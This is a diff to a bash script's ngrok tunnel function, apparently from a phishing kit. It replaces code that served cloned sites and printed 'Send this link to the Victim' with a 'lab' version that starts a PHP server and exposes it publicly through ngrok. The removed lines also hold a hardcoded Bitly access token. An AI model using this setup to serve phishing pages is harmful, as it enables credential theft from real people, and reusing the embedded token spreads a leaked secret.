@@ -353,89 +353,86 @@ fi
 }
 
 start_ngrok() {
-if [[ -e sites/$server/ip.txt ]]; then
-rm -rf sites/$server/ip.txt
 
-fi
-if [[ -e sites/$server/usernames.txt ]]; then
-rm -rf sites/$server/usernames.txt
+    # Find ngrok installed by the user
+    ngrok_bin="$(command -v ngrok)"
 
-fi
+    if [[ -z "$ngrok_bin" ]]; then
+        printf "\e[1;91m[!]\e[0m ngrok is not installed in your PATH.\n"
+        printf "\e[1;91m[!]\e[0m Install the current ngrok release and try again.\n"
+        return 1
+    fi
 
+    # Check ngrok version
+    ngrok_version="$("$ngrok_bin" version 2>/dev/null | awk '{print $3}')"
 
-if [[ -e ngrok ]]; then
-echo ""
-else
+    if [[ -z "$ngrok_version" ]]; then
+        printf "\e[1;91m[!]\e[0m Could not determine ngrok version.\n"
+        return 1
+    fi
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip 
+    ngrok_major="${ngrok_version%%.*}"
 
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip
-chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
-else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-exit 1
-fi
+    if [[ "$ngrok_major" -lt 3 ]]; then
+        printf "\e[1;91m[!]\e[0m Your ngrok version is too old: %s\n" "$ngrok_version"
+        printf "\e[1;91m[!]\e[0m Please update ngrok and try again.\n"
+        return 1
+    fi
 
+    printf "\e[1;92m[*]\e[0m Using ngrok: %s\n" "$ngrok_bin"
+    printf "\e[1;92m[*]\e[0m Version: %s\n" "$ngrok_version"
 
+    # Start your local test server in the background.
+    # Change 5555 if your lab server uses another port.
+    php -S 127.0.0.1:5555 >/tmp/lab-php.log 2>&1 &
+    php_pid=$!
 
-else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip 
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip 
-chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
-fi
-fi
+    sleep 1
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:5555 &
-sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-ngrok_bin=$(command -v ngrok)
+    # Make sure PHP actually started
+    if ! kill -0 "$php_pid" 2>/dev/null; then
+        printf "\e[1;91m[!]\e[0m PHP server failed to start.\n"
+        cat /tmp/lab-php.log
+        return 1
+    fi
 
-if [[ -z "$ngrok_bin" ]]; then
-    printf "\e[1;91m[!]\e[0m ngrok is not installed in your PATH.\n"
-    printf "\e[1;91m[!]\e[0m Please install ngrok and try again.\n"
-    return 1;
-fi
-ngrok_version="$("$ngrok_bin" version | awk '{print $3}')"
-ngrok_major="${ngrok_version%%.*}"
-if [[ "$ngrok_major" -lt 3 ]]; then 
-printf  "\e[1;91m[!]\e[0m Your ngrok version is too old: %s\n" "$ngrok_version"
-printf "\e[1;91m[!]\e[0m Update ngrok and try again."
-return 1
-fi
+    printf "\e[1;92m[*]\e[0m Starting ngrok...\n"
 
-"$ngrok_bin" http 127.0.0.1:5555 &
-ngrok_flag=false
-for i in {1..20};do
-if curl -s http://127.0.0.1:4040/api/tunnels | jq -e '.tunnels[0].public_url';then
-ngrok_flag=true
-break
-fi
-sleep 1
-done
-if [[ "$ngrok_flag" != true ]]; then
-printf "\e[1;91m[!]\e[0m ngrok failed to run or no tunnel was created.\n"
-return 1
-fi
+    "$ngrok_bin" http 127.0.0.1:5555 >/tmp/lab-ngrok.log 2>&1 &
+    ngrok_pid=$!
 
-link=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
-Accesstoken=433bdc6028d67bba06cf95286e923cde8c0906c7
-api=https://api-ssl.bitly.com/v4/shorten
-short_link=`curl -s -H Authorization:\ $Accesstoken -H Content-Type: -d '{"long_url": "'"$link"\"} $api | jq -j .link | xsel -ib; xsel -ob;` 
-printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
+    # Wait for the ngrok API instead of using a fixed sleep
+    ngrok_ready=false
+
+    for i in {1..20}; do
+        if curl -fsS http://127.0.0.1:4040/api/tunnels >/tmp/ngrok-tunnels.json 2>/dev/null; then
+            ngrok_ready=true
+            break
+        fi
+
+        sleep 1
+    done
+
+    if [[ "$ngrok_ready" != true ]]; then
+        printf "\e[1;91m[!]\e[0m ngrok failed to start or its API is unavailable.\n"
+        printf "\e[1;91m[!]\e[0m ngrok output:\n"
+        cat /tmp/lab-ngrok.log
+        kill "$php_pid" "$ngrok_pid" 2>/dev/null
+        return 1
+    fi
+
+    # Extract the public URL
+    link="$(jq -r '.tunnels[0].public_url // empty' /tmp/ngrok-tunnels.json)"
+
+    if [[ -z "$link" ]]; then
+        printf "\e[1;91m[!]\e[0m ngrok is running but no public tunnel was returned.\n"
+        cat /tmp/ngrok-tunnels.json
+        return 1
+    fi
+
+    printf "\e[1;92m[*]\e[0m Tunnel ready:\n"
+    printf "    %s\n" "$link"
+}
 echo ""
 echo ""
 
